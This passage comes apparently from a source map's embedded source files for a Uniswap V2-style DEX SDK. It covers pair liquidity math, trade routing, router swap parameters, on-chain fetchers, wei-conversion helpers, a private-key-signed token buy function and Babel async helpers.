TokenAmount(this.liquidityToken, liquidity)\n  }\n\n  public getLiquidityValue(\n    token: Token,\n    totalSupply: TokenAmount,\n    liquidity: TokenAmount,\n    feeOn: boolean = false,\n    kLast?: BigintIsh\n  ): TokenAmount {\n    invariant(this.involvesToken(token), 'TOKEN')\n    invariant(totalSupply.token.equals(this.liquidityToken), 'TOTAL_SUPPLY')\n    invariant(liquidity.token.equals(this.liquidityToken), 'LIQUIDITY')\n    invariant(JSBI.lessThanOrEqual(liquidity.raw, totalSupply.raw), 'LIQUIDITY')\n\n    let totalSupplyAdjusted: TokenAmount\n    if (!feeOn) {\n      totalSupplyAdjusted = totalSupply\n    } else {\n      invariant(!!kLast, 'K_LAST')\n      const kLastParsed = parseBigintIsh(kLast)\n      if (!JSBI.equal(kLastParsed, ZERO)) {\n        const rootK = sqrt(JSBI.multiply(this.reserve0.raw, this.reserve1.raw))\n        const rootKLast = sqrt(kLastParsed)\n        if (JSBI.greaterThan(rootK, rootKLast)) {\n          const numerator = JSBI.multiply(totalSupply.raw, JSBI.subtract(rootK, rootKLast))\n          const denominator = JSBI.add(JSBI.multiply(rootK, FIVE), rootKLast)\n          const feeLiquidity = JSBI.divide(numerator, denominator)\n          totalSupplyAdjusted = totalSupply.add(new TokenAmount(this.liquidityToken, feeLiquidity))\n        } else {\n          totalSupplyAdjusted = totalSupply\n        }\n      } else {\n        totalSupplyAdjusted = totalSupply\n      }\n    }\n\n    return new TokenAmount(\n      token,\n      JSBI.divide(JSBI.multiply(liquidity.raw, this.reserveOf(token).raw), totalSupplyAdjusted.raw)\n    )\n  }\n}\n","import { ChainId } from '../constants'\nimport invariant from 'tiny-invariant'\n\nimport { Currency, ETHER } from './currency'\nimport { Token, WETH } from './token'\nimport { Pair } from './pair'\nimport { Price } from './fractions/price'\n\nexport class Route {\n  public readonly pairs: Pair[]\n  public readonly path: Token[]\n  public readonly input: Currency\n  public readonly output: Currency\n  public readonly midPrice: Price\n\n  public constructor(pairs: Pair[], input: Currency, output?: Currency) {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(\n      pairs.every(pair => pair.chainId === pairs[0].chainId),\n      'CHAIN_IDS'\n    )\n    invariant(\n      (input instanceof Token && pairs[0].involvesToken(input)) ||\n        (input === ETHER && pairs[0].involvesToken(WETH[pairs[0].chainId])),\n      'INPUT'\n    )\n    invariant(\n      typeof output === 'undefined' ||\n        (output instanceof Token && pairs[pairs.length - 1].involvesToken(output)) ||\n        (output === ETHER && pairs[pairs.length - 1].involvesToken(WETH[pairs[0].chainId])),\n      'OUTPUT'\n    )\n\n    const path: Token[] = [input instanceof Token ? input : WETH[pairs[0].chainId]]\n    for (const [i, pair] of pairs.entries()) {\n      const currentInput = path[i]\n      invariant(currentInput.equals(pair.token0) || currentInput.equals(pair.token1), 'PATH')\n      const output = currentInput.equals(pair.token0) ? pair.token1 : pair.token0\n      path.push(output)\n    }\n\n    this.pairs = pairs\n    this.path = path\n    this.midPrice = Price.fromRoute(this)\n    this.input = input\n    this.output = output ?? path[path.length - 1]\n  }\n\n  public get chainId(): ChainId {\n    return this.pairs[0].chainId\n  }\n}\n","import { Rounding, _100 } from '../../constants'\nimport { Fraction } from './fraction'\n\nconst _100_PERCENT = new Fraction(_100)\n\nexport class Percent extends Fraction {\n  public toSignificant(significantDigits: number = 5, format?: object, rounding?: Rounding): string {\n    return this.multiply(_100_PERCENT).toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(decimalPlaces: number = 2, format?: object, rounding?: Rounding): string {\n    return this.multiply(_100_PERCENT).toFixed(decimalPlaces, format, rounding)\n  }\n}\n","import invariant from 'tiny-invariant'\n\nimport { ChainId, ONE, TradeType, ZERO } from '../constants'\nimport { sortedInsert } from '../utils'\nimport { Currency, ETHER } from './currency'\nimport { CurrencyAmount } from './fractions/currencyAmount'\nimport { Fraction } from './fractions/fraction'\nimport { Percent } from './fractions/percent'\nimport { Price } from './fractions/price'\nimport { TokenAmount } from './fractions/tokenAmount'\nimport { Pair } from './pair'\nimport { Route } from './route'\nimport { currencyEquals, Token, WETH } from './token'\n\n/**\n * Returns the percent difference between the mid price and the execution price, i.e. price impact.\n * @param midPrice mid price before the trade\n * @param inputAmount the input amount of the trade\n * @param outputAmount the output amount of the trade\n */\nfunction computePriceImpact(midPrice: Price, inputAmount: CurrencyAmount, outputAmount: CurrencyAmount): Percent {\n  const exactQuote = midPrice.raw.multiply(inputAmount.raw)\n  // calculate slippage := (exactQuote - outputAmount) / exactQuote\n  const slippage = exactQuote.subtract(outputAmount.raw).divide(exactQuote)\n  return new Percent(slippage.numerator, slippage.denominator)\n}\n\n// minimal interface so the input output comparator may be shared across types\ninterface InputOutput {\n  readonly inputAmount: CurrencyAmount\n  readonly outputAmount: CurrencyAmount\n}\n\n// comparator function that allows sorting trades by their output amounts, in decreasing order, and then input amounts\n// in increasing order. i.e. the best trades have the most outputs for the least inputs and are sorted first\nexport function inputOutputComparator(a: InputOutput, b: InputOutput): number {\n  // must have same input and output token for comparison\n  invariant(currencyEquals(a.inputAmount.currency, b.inputAmount.currency), 'INPUT_CURRENCY')\n  invariant(currencyEquals(a.outputAmount.currency, b.outputAmount.currency), 'OUTPUT_CURRENCY')\n  if (a.outputAmount.equalTo(b.outputAmount)) {\n    if (a.inputAmount.equalTo(b.inputAmount)) {\n      return 0\n    }\n    // trade A requires less input than trade B, so A should come first\n    if (a.inputAmount.lessThan(b.inputAmount)) {\n      return -1\n    } else {\n      return 1\n    }\n  } else {\n    // tradeA has less output than trade B, so should come second\n    if (a.outputAmount.lessThan(b.outputAmount)) {\n      return 1\n    } else {\n      return -1\n    }\n  }\n}\n\n// extension of the input output comparator that also considers other dimensions of the trade in ranking them\nexport function tradeComparator(a: Trade, b: Trade) {\n  const ioComp = inputOutputComparator(a, b)\n  if (ioComp !== 0) {\n    return ioComp\n  }\n\n  // consider lowest slippage next, since these are less likely to fail\n  if (a.priceImpact.lessThan(b.priceImpact)) {\n    return -1\n  } else if (a.priceImpact.greaterThan(b.priceImpact)) {\n    return 1\n  }\n\n  // finally consider the number of hops since each hop costs gas\n  return a.route.path.length - b.route.path.length\n}\n\nexport interface BestTradeOptions {\n  // how many results to return\n  maxNumResults?: number\n  // the maximum number of hops a trade should contain\n  maxHops?: number\n}\n\n/**\n * Given a currency amount and a chain ID, returns the equivalent representation as the token amount.\n * In other words, if the currency is ETHER, returns the WETH token amount for the given chain. Otherwise, returns\n * the input currency amount.\n */\nfunction wrappedAmount(currencyAmount: CurrencyAmount, chainId: ChainId): TokenAmount {\n  if (currencyAmount instanceof TokenAmount) return currencyAmount\n  if (currencyAmount.currency === ETHER) return new TokenAmount(WETH[chainId], currencyAmount.raw)\n  invariant(false, 'CURRENCY')\n}\n\nfunction wrappedCurrency(currency: Currency, chainId: ChainId): Token {\n  if (currency instanceof Token) return currency\n  if (currency === ETHER) return WETH[chainId]\n  invariant(false, 'CURRENCY')\n}\n\n/**\n * Represents a trade executed against a list of pairs.\n * Does not account for slippage, i.e. trades that front run this trade and move the price.\n */\nexport class Trade {\n  /**\n   * The route of the trade, i.e. which pairs the trade goes through.\n   */\n  public readonly route: Route\n  /**\n   * The type of the trade, either exact in or exact out.\n   */\n  public readonly tradeType: TradeType\n  /**\n   * The input amount for the trade assuming no slippage.\n   */\n  public readonly inputAmount: CurrencyAmount\n  /**\n   * The output amount for the trade assuming no slippage.\n   */\n  public readonly outputAmount: CurrencyAmount\n  /**\n   * The price expressed in terms of output amount/input amount.\n   */\n  public readonly executionPrice: Price\n  /**\n   * The mid price after the trade executes assuming no slippage.\n   */\n  public readonly nextMidPrice: Price\n  /**\n   * The percent difference between the mid price before the trade and the trade execution price.\n   */\n  public readonly priceImpact: Percent\n\n  /**\n   * Constructs an exact in trade with the given amount in and route\n   * @param route route of the exact in trade\n   * @param amountIn the amount being passed in\n   */\n  public static exactIn(route: Route, amountIn: CurrencyAmount): Trade {\n    return new Trade(route, amountIn, TradeType.EXACT_INPUT)\n  }\n\n  /**\n   * Constructs an exact out trade with the given amount out and route\n   * @param route route of the exact out trade\n   * @param amountOut the amount returned by the trade\n   */\n  public static exactOut(route: Route, amountOut: CurrencyAmount): Trade {\n    return new Trade(route, amountOut, TradeType.EXACT_OUTPUT)\n  }\n\n  public constructor(route: Route, amount: CurrencyAmount, tradeType: TradeType) {\n    const amounts: TokenAmount[] = new Array(route.path.length)\n    const nextPairs: Pair[] = new Array(route.pairs.length)\n    if (tradeType === TradeType.EXACT_INPUT) {\n      invariant(currencyEquals(amount.currency, route.input), 'INPUT')\n      amounts[0] = wrappedAmount(amount, route.chainId)\n      for (let i = 0; i < route.path.length - 1; i++) {\n        const pair = route.pairs[i]\n        const [outputAmount, nextPair] = pair.getOutputAmount(amounts[i])\n        amounts[i + 1] = outputAmount\n        nextPairs[i] = nextPair\n      }\n    } else {\n      invariant(currencyEquals(amount.currency, route.output), 'OUTPUT')\n      amounts[amounts.length - 1] = wrappedAmount(amount, route.chainId)\n      for (let i = route.path.length - 1; i > 0; i--) {\n        const pair = route.pairs[i - 1]\n        const [inputAmount, nextPair] = pair.getInputAmount(amounts[i])\n        amounts[i - 1] = inputAmount\n        nextPairs[i - 1] = nextPair\n      }\n    }\n\n    this.route = route\n    this.tradeType = tradeType\n    this.inputAmount =\n      tradeType === TradeType.EXACT_INPUT\n        ? amount\n        : route.input === ETHER\n        ? CurrencyAmount.ether(amounts[0].raw)\n        : amounts[0]\n    this.outputAmount =\n      tradeType === TradeType.EXACT_OUTPUT\n        ? amount\n        : route.output === ETHER\n        ? CurrencyAmount.ether(amounts[amounts.length - 1].raw)\n        : amounts[amounts.length - 1]\n    this.executionPrice = new Price(\n      this.inputAmount.currency,\n      this.outputAmount.currency,\n      this.inputAmount.raw,\n      this.outputAmount.raw\n    )\n    this.nextMidPrice = Price.fromRoute(new Route(nextPairs, route.input))\n    this.priceImpact = computePriceImpact(route.midPrice, this.inputAmount, this.outputAmount)\n  }\n\n  /**\n   * Get the minimum amount that must be received from this trade for the given slippage tolerance\n   * @param slippageTolerance tolerance of unfavorable slippage from the execution price of this trade\n   */\n  public minimumAmountOut(slippageTolerance: Percent): CurrencyAmount {\n    invariant(!slippageTolerance.lessThan(ZERO), 'SLIPPAGE_TOLERANCE')\n    if (this.tradeType === TradeType.EXACT_OUTPUT) {\n      return this.outputAmount\n    } else {\n      const slippageAdjustedAmountOut = new Fraction(ONE)\n        .add(slippageTolerance)\n        .invert()\n        .multiply(this.outputAmount.raw).quotient\n      return this.outputAmount instanceof TokenAmount\n        ? new TokenAmount(this.outputAmount.token, slippageAdjustedAmountOut)\n        : CurrencyAmount.ether(slippageAdjustedAmountOut)\n    }\n  }\n\n  /**\n   * Get the maximum amount in that can be spent via this trade for the given slippage tolerance\n   * @param slippageTolerance tolerance of unfavorable slippage from the execution price of this trade\n   */\n  public maximumAmountIn(slippageTolerance: Percent): CurrencyAmount {\n    invariant(!slippageTolerance.lessThan(ZERO), 'SLIPPAGE_TOLERANCE')\n    if (this.tradeType === TradeType.EXACT_INPUT) {\n      return this.inputAmount\n    } else {\n      const slippageAdjustedAmountIn = new Fraction(ONE).add(slippageTolerance).multiply(this.inputAmount.raw).quotient\n      return this.inputAmount instanceof TokenAmount\n        ? new TokenAmount(this.inputAmount.token, slippageAdjustedAmountIn)\n        : CurrencyAmount.ether(slippageAdjustedAmountIn)\n    }\n  }\n\n  /**\n   * Given a list of pairs, and a fixed amount in, returns the top `maxNumResults` trades that go from an input token\n   * amount to an output token, making at most `maxHops` hops.\n   * Note this does not consider aggregation, as routes are linear. It's possible a better route exists by splitting\n   * the amount in among multiple routes.\n   * @param pairs the pairs to consider in finding the best trade\n   * @param currencyAmountIn exact amount of input currency to spend\n   * @param currencyOut the desired currency out\n   * @param maxNumResults maximum number of results to return\n   * @param maxHops maximum number of hops a returned trade can make, e.g. 1 hop goes through a single pair\n   * @param currentPairs used in recursion; the current list of pairs\n   * @param originalAmountIn used in recursion; the original value of the currencyAmountIn parameter\n   * @param bestTrades used in recursion; the current list of best trades\n   */\n  public static bestTradeExactIn(\n    pairs: Pair[],\n    currencyAmountIn: CurrencyAmount,\n    currencyOut: Currency,\n    { maxNumResults = 3, maxHops = 3 }: BestTradeOptions = {},\n    // used in recursion.\n    currentPairs: Pair[] = [],\n    originalAmountIn: CurrencyAmount = currencyAmountIn,\n    bestTrades: Trade[] = []\n  ): Trade[] {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(maxHops > 0, 'MAX_HOPS')\n    invariant(originalAmountIn === currencyAmountIn || currentPairs.length > 0, 'INVALID_RECURSION')\n    const chainId: ChainId | undefined =\n      currencyAmountIn instanceof TokenAmount\n        ? currencyAmountIn.token.chainId\n        : currencyOut instanceof Token\n        ? currencyOut.chainId\n        : undefined\n    invariant(chainId !== undefined, 'CHAIN_ID')\n\n    const amountIn = wrappedAmount(currencyAmountIn, chainId)\n    const tokenOut = wrappedCurrency(currencyOut, chainId)\n    for (let i = 0; i < pairs.length; i++) {\n      const pair = pairs[i]\n      // pair irrelevant\n      if (!pair.token0.equals(amountIn.token) && !pair.token1.equals(amountIn.token)) continue\n      if (pair.reserve0.equalTo(ZERO) || pair.reserve1.equalTo(ZERO)) continue\n\n      let amountOut: TokenAmount\n      try {\n        ;[amountOut] = pair.getOutputAmount(amountIn)\n      } catch (error) {\n        // input too low\n        if (error.isInsufficientInputAmountError) {\n          continue\n        }\n        throw error\n      }\n      // we have arrived at the output token, so this is the final trade of one of the paths\n      if (amountOut.token.equals(tokenOut)) {\n        sortedInsert(\n          bestTrades,\n          new Trade(\n            new Route([...currentPairs, pair], originalAmountIn.currency, currencyOut),\n            originalAmountIn,\n            TradeType.EXACT_INPUT\n          ),\n          maxNumResults,\n          tradeComparator\n        )\n      } else if (maxHops > 1 && pairs.length > 1) {\n        const pairsExcludingThisPair = pairs.slice(0, i).concat(pairs.slice(i + 1, pairs.length))\n\n        // otherwise, consider all the other paths that lead from this token as long as we have not exceeded maxHops\n        Trade.bestTradeExactIn(\n          pairsExcludingThisPair,\n          amountOut,\n          currencyOut,\n          {\n            maxNumResults,\n            maxHops: maxHops - 1\n          },\n          [...currentPairs, pair],\n          originalAmountIn,\n          bestTrades\n        )\n      }\n    }\n\n    return bestTrades\n  }\n\n  /**\n   * similar to the above method but instead targets a fixed output amount\n   * given a list of pairs, and a fixed amount out, returns the top `maxNumResults` trades that go from an input token\n   * to an output token amount, making at most `maxHops` hops\n   * note this does not consider aggregation, as routes are linear. it's possible a better route exists by splitting\n   * the amount in among multiple routes.\n   * @param pairs the pairs to consider in finding the best trade\n   * @param currencyIn the currency to spend\n   * @param currencyAmountOut the exact amount of currency out\n   * @param maxNumResults maximum number of results to return\n   * @param maxHops maximum number of hops a returned trade can make, e.g. 1 hop goes through a single pair\n   * @param currentPairs used in recursion; the current list of pairs\n   * @param originalAmountOut used in recursion; the original value of the currencyAmountOut parameter\n   * @param bestTrades used in recursion; the current list of best trades\n   */\n  public static bestTradeExactOut(\n    pairs: Pair[],\n    currencyIn: Currency,\n    currencyAmountOut: CurrencyAmount,\n    { maxNumResults = 3, maxHops = 3 }: BestTradeOptions = {},\n    // used in recursion.\n    currentPairs: Pair[] = [],\n    originalAmountOut: CurrencyAmount = currencyAmountOut,\n    bestTrades: Trade[] = []\n  ): Trade[] {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(maxHops > 0, 'MAX_HOPS')\n    invariant(originalAmountOut === currencyAmountOut || currentPairs.length > 0, 'INVALID_RECURSION')\n    const chainId: ChainId | undefined =\n      currencyAmountOut instanceof TokenAmount\n        ? currencyAmountOut.token.chainId\n        : currencyIn instanceof Token\n        ? currencyIn.chainId\n        : undefined\n    invariant(chainId !== undefined, 'CHAIN_ID')\n\n    const amountOut = wrappedAmount(currencyAmountOut, chainId)\n    const tokenIn = wrappedCurrency(currencyIn, chainId)\n    for (let i = 0; i < pairs.length; i++) {\n      const pair = pairs[i]\n      // pair irrelevant\n      if (!pair.token0.equals(amountOut.token) && !pair.token1.equals(amountOut.token)) continue\n      if (pair.reserve0.equalTo(ZERO) || pair.reserve1.equalTo(ZERO)) continue\n\n      let amountIn: TokenAmount\n      try {\n        ;[amountIn] = pair.getInputAmount(amountOut)\n      } catch (error) {\n        // not enough liquidity in this pair\n        if (error.isInsufficientReservesError) {\n          continue\n        }\n        throw error\n      }\n      // we have arrived at the input token, so this is the first trade of one of the paths\n      if (amountIn.token.equals(tokenIn)) {\n        sortedInsert(\n          bestTrades,\n          new Trade(\n            new Route([pair, ...currentPairs], currencyIn, originalAmountOut.currency),\n            originalAmountOut,\n            TradeType.EXACT_OUTPUT\n          ),\n          maxNumResults,\n          tradeComparator\n        )\n      } else if (maxHops > 1 && pairs.length > 1) {\n        const pairsExcludingThisPair = pairs.slice(0, i).concat(pairs.slice(i + 1, pairs.length))\n\n        // otherwise, consider all the other paths that arrive at this token as long as we have not exceeded maxHops\n        Trade.bestTradeExactOut(\n          pairsExcludingThisPair,\n          currencyIn,\n          amountIn,\n          {\n            maxNumResults,\n            maxHops: maxHops - 1\n          },\n          [pair, ...currentPairs],\n          originalAmountOut,\n          bestTrades\n        )\n      }\n    }\n\n    return bestTrades\n  }\n}\n","import { TradeType } from './constants'\nimport invariant from 'tiny-invariant'\nimport { validateAndParseAddress } from './utils'\nimport { CurrencyAmount, ETHER, Percent, Trade } from './entities'\n\n/**\n * Options for producing the arguments to send call to the router.\n */\nexport interface TradeOptions {\n  /**\n   * How much the execution price is allowed to move unfavorably from the trade execution price.\n   */\n  allowedSlippage: Percent\n  /**\n   * How long the swap is valid until it expires, in seconds.\n   * This will be used to produce a `deadline` parameter which is computed from when the swap call parameters\n   * are generated.\n   */\n  ttl: number\n  /**\n   * The account that should receive the output of the swap.\n   */\n  recipient: string\n\n  /**\n   * Whether any of the tokens in the path are fee on transfer tokens, which should be handled with special methods\n   */\n  feeOnTransfer?: boolean\n}\n\n/**\n * The parameters to use in the call to the Uniswap V2 Router to execute a trade.\n */\nexport interface SwapParameters {\n  /**\n   * The method to call on the Uniswap V2 Router.\n   */\n  methodName: string\n  /**\n   * The arguments to pass to the method, all hex encoded.\n   */\n  args: (string | string[])[]\n  /**\n   * The amount of wei to send in hex.\n   */\n  value: string\n}\n\nfunction toHex(currencyAmount: CurrencyAmount) {\n  return `0x${currencyAmount.raw.toString(16)}`\n}\n\nconst ZERO_HEX = '0x0'\n\n/**\n * Represents the Uniswap V2 Router, and has static methods for helping execute trades.\n */\nexport abstract class Router {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n  /**\n   * Produces the on-chain method name to call and the hex encoded parameters to pass as arguments for a given trade.\n   * @param trade to produce call parameters for\n   * @param options options for the call parameters\n   */\n  public static swapCallParameters(trade: Trade, options: TradeOptions): SwapParameters {\n    const etherIn = trade.inputAmount.currency === ETHER\n    const etherOut = trade.outputAmount.currency === ETHER\n    // the router does not support both ether in and out\n    invariant(!(etherIn && etherOut), 'ETHER_IN_OUT')\n    invariant(options.ttl > 0, 'TTL')\n\n    const to: string = validateAndParseAddress(options.recipient)\n    const amountIn: string = toHex(trade.maximumAmountIn(options.allowedSlippage))\n    const amountOut: string = toHex(trade.minimumAmountOut(options.allowedSlippage))\n    const path: string[] = trade.route.path.map(token => token.address)\n    const deadline = `0x${(Math.floor(new Date().getTime() / 1000) + options.ttl).toString(16)}`\n    const useFeeOnTransfer = Boolean(options.feeOnTransfer)\n\n    let methodName: string\n    let args: (string | string[])[]\n    let value: string\n    switch (trade.tradeType) {\n      case TradeType.EXACT_INPUT:\n        if (etherIn) {\n          methodName = useFeeOnTransfer ? 'swapExactETHForTokensSupportingFeeOnTransferTokens' : 'swapExactETHForTokens'\n          // (uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountOut, path, to, deadline]\n          value = amountIn\n        } else if (etherOut) {\n          methodName = useFeeOnTransfer ? 'swapExactTokensForETHSupportingFeeOnTransferTokens' : 'swapExactTokensForETH'\n          // (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountIn, amountOut, path, to, deadline]\n          value = ZERO_HEX\n        } else {\n          methodName = useFeeOnTransfer\n            ? 'swapExactTokensForTokensSupportingFeeOnTransferTokens'\n            : 'swapExactTokensForTokens'\n          // (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountIn, amountOut, path, to, deadline]\n          value = ZERO_HEX\n        }\n        break\n      case TradeType.EXACT_OUTPUT:\n        invariant(!useFeeOnTransfer, 'EXACT_OUT_FOT')\n        if (etherIn) {\n          methodName = 'swapETHForExactTokens'\n          // (uint amountOut, address[] calldata path, address to, uint deadline)\n          args = [amountOut, path, to, deadline]\n          value = amountIn\n        } else if (etherOut) {\n          methodName = 'swapTokensForExactETH'\n          // (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n          args = [amountOut, amountIn, path, to, deadline]\n          value = ZERO_HEX\n        } else {\n          methodName = 'swapTokensForExactTokens'\n          // (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n          args = [amountOut, amountIn, path, to, deadline]\n          value = ZERO_HEX\n        }\n        break\n    }\n    return {\n      methodName,\n      args,\n      value\n    }\n  }\n}\n","import { Contract } from '@ethersproject/contracts'\nimport { getNetwork } from '@ethersproject/networks'\nimport { getDefaultProvider } from '@ethersproject/providers'\nimport { TokenAmount } from './entities/fractions/tokenAmount'\nimport { Pair } from './entities/pair'\nimport ISwapPair from './abis/SwapPair.json'\nimport invariant from 'tiny-invariant'\nimport ERC20 from './abis/ERC20.json'\nimport { ChainId } from './constants'\nimport { Token } from './entities/token'\n\nlet TOKEN_DECIMALS_CACHE: { [chainId: number]: { [address: string]: number } } = {\n  [ChainId.MAINNET]: {\n    '0xE0B7927c4aF23765Cb51314A0E0521A9645F0E2A': 9 // DGD\n  }\n}\n\n/**\n * Contains methods for constructing instances of pairs and tokens from on-chain data.\n */\nexport abstract class Fetcher {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  /**\n   * Fetch information for a given token on the given chain, using the given ethers provider.\n   * @param chainId chain of the token\n   * @param address address of the token on the chain\n   * @param provider provider used to fetch the token\n   * @param symbol optional symbol of the token\n   * @param name optional name of the token\n   */\n  public static async fetchTokenData(\n    chainId: ChainId,\n    address: string,\n    provider = getDefaultProvider(getNetwork(chainId)),\n    symbol?: string,\n    name?: string\n  ): Promise<Token> {\n    const parsedDecimals =\n      typeof TOKEN_DECIMALS_CACHE?.[chainId]?.[address] === 'number'\n        ? TOKEN_DECIMALS_CACHE[chainId][address]\n        : await new Contract(address, ERC20, provider).decimals().then((decimals: number): number => {\n            TOKEN_DECIMALS_CACHE = {\n              ...TOKEN_DECIMALS_CACHE,\n              [chainId]: {\n                ...TOKEN_DECIMALS_CACHE?.[chainId],\n                [address]: decimals\n              }\n            }\n            return decimals\n          })\n    return new Token(chainId, address, parsedDecimals, symbol, name)\n  }\n\n  /**\n   * Fetches information about a pair and constructs a pair from the given two tokens.\n   * @param tokenA first token\n   * @param tokenB second token\n   * @param provider the provider to use to fetch the data\n   */\n  public static async fetchPairData(\n    tokenA: Token,\n    tokenB: Token,\n    provider = getDefaultProvider(getNetwork(tokenA.chainId))\n  ): Promise<Pair> {\n    invariant(tokenA.chainId === tokenB.chainId, 'CHAIN_ID')\n    const address = Pair.getAddress(tokenA, tokenB)\n    const [reserves0, reserves1] = await new Contract(address, ISwapPair.abi, provider).getReserves()\n    const balances = tokenA.sortsBefore(tokenB) ? [reserves0, reserves1] : [reserves1, reserves0]\n    return new Pair(new TokenAmount(tokenA, balances[0]), new TokenAmount(tokenB, balances[1]))\n  }\n}\n","import web3 from 'web3';\n\nexport const convertToWei = (value:any, decimal:any) => {\n  if (Number(decimal) === 18) return web3.utils.toWei(value.toString(), \"ether\");\n  else if (Number(decimal) === 6)\n    return web3.utils.toWei(value.toString(), \"picoether\");\n  else if (Number(decimal) === 9)\n    return web3.utils.toWei(value.toString(), \"nanoether\");\n  else if (Number(decimal) === 12)\n    return web3.utils.toWei(value.toString(), \"microether\");\n  else if (Number(decimal) === 15)\n    return web3.utils.toWei(value.toString(), \"milliether\");\n  else return value.toWei() / 10 ** Number(decimal);\n};\n\nexport const convertFromWei = (value:any, decimal:any) => {\n  if (Number(decimal) === 18) return web3.utils.fromWei(value.toString(), \"ether\");\n  else if (Number(decimal) === 6)\n    return web3.utils.fromWei(value.toString(), \"picoether\");\n  else if (Number(decimal) === 9)\n    return web3.utils.fromWei(value.toString(), \"nanoether\");\n  else if (Number(decimal) === 12)\n    return web3.utils.fromWei(value.toString(), \"microether\");\n  else if (Number(decimal) === 15)\n    return web3.utils.fromWei(value.toString(), \"milliether\");\n  else return value.toString() / 10 ** Number(decimal);\n};\nexport const convertFixed = (value:any) => {\n  if (Number(value) === 0) \n    return value ?.toFixed(2) ?.replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\"); \n  else if (Number(value) > 1e3)\n    return value ?.toFixed(0) ?.replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\"); \n  else if (Number(value) < 1 && Number(value) >= 9e-4) \n    return value?.toFixed(4); \n    else if (Number(value) < 9e-4 && Number(value) >= 9e-7) \n    return value?.toFixed(7); \n  else return value.toFixed(2);\n};\n\n","\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH,AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function buyTokenETH(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensOnlyBuy(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensOnlyBuy(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt:any = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn BUY: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { buyTokenETH };\n","// A type of promise-like that resolves synchronously and supports only one observer\nexport const _Pact = /*#__PURE__*/(function() {\n\tfunction _Pact() {}\n\t_Pact.prototype.then = function(onFulfilled, onRejected) {\n\t\tconst result = new _Pact();\n\t\tconst state = this.s;\n\t\tif (state) {\n\t\t\tconst callback = state & 1 ? onFulfilled : onRejected;\n\t\t\tif (callback) {\n\t\t\t\ttry {\n\t\t\t\t\t_settle(result, 1, callback(this.v));\n\t\t\t\t} catch (e) {\n\t\t\t\t\t_settle(result, 2, e);\n\t\t\t\t}\n\t\t\t\treturn result;\n\t\t\t} else {\n\t\t\t\treturn this;\n\t\t\t}\n\t\t}\n\t\tthis.o = function(_this) {\n\t\t\ttry {\n\t\t\t\tconst value = _this.v;\n\t\t\t\tif (_this.s & 1) {\n\t\t\t\t\t_settle(result, 1, onFulfilled ? onFulfilled(value) : value);\n\t\t\t\t} else if (onRejected) {\n\t\t\t\t\t_settle(result, 1, onRejected(value));\n\t\t\t\t} else {\n\t\t\t\t\t_settle(result, 2, value);\n\t\t\t\t}\n\t\t\t} catch (e) {\n\t\t\t\t_settle(result, 2, e);\n\t\t\t}\n\t\t};\n\t\treturn result;\n\t}\n\treturn _Pact;\n})();\n\n// Settles a pact synchronously\nexport function _settle(pact, state, value) {\n\tif (!pact.s) {\n\t\tif (value instanceof _Pact) {\n\t\t\tif (value.s) {\n\t\t\t\tif (state & 1) {\n\t\t\t\t\tstate = value.s;\n\t\t\t\t}\n\t\t\t\tvalue = value.v;\n\t\t\t} else {\n\t\t\t\tvalue.o = _settle.bind(null, pact, state);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tif (value && value.then) {\n\t\t\tvalue.then(_settle.bind(null, pact, state), _settle.bind(null, pact, 2));\n\t\t\treturn;\n\t\t}\n\t\tpact.s = state;\n\t\tpact.v = value;\n\t\tconst observer = pact.o;\n\t\tif (observer) {\n\t\t\tobserver(pact);\n\t\t}\n\t}\n}\n\nexport function _isSettledPact(thenable) {\n\treturn thenable instanceof _Pact && thenable.s & 1;\n}\n\n// Converts argument to a function that always returns a Promise\nexport function _async(f) {\n\treturn function() {\n\t\tfor (var args = [], i = 0; i < arguments.length; i++) {\n\t\t\targs[i] = arguments[i];\n\t\t}\n\t\ttry {\n\t\t\treturn Promise.resolve(f.apply(this, args));\n\t\t} catch(e) {\n\t\t\treturn Promise.reject(e);\n\t\t}\n\t}\n}\n\n// Awaits on a value that may or may not be a Promise (equivalent to the await keyword in ES2015, with continuations passed explicitly)\nexport function _await(value, then, direct) {\n\tif (direct) {\n\t\treturn then ? then(value) : value;\n\t}\n\tif 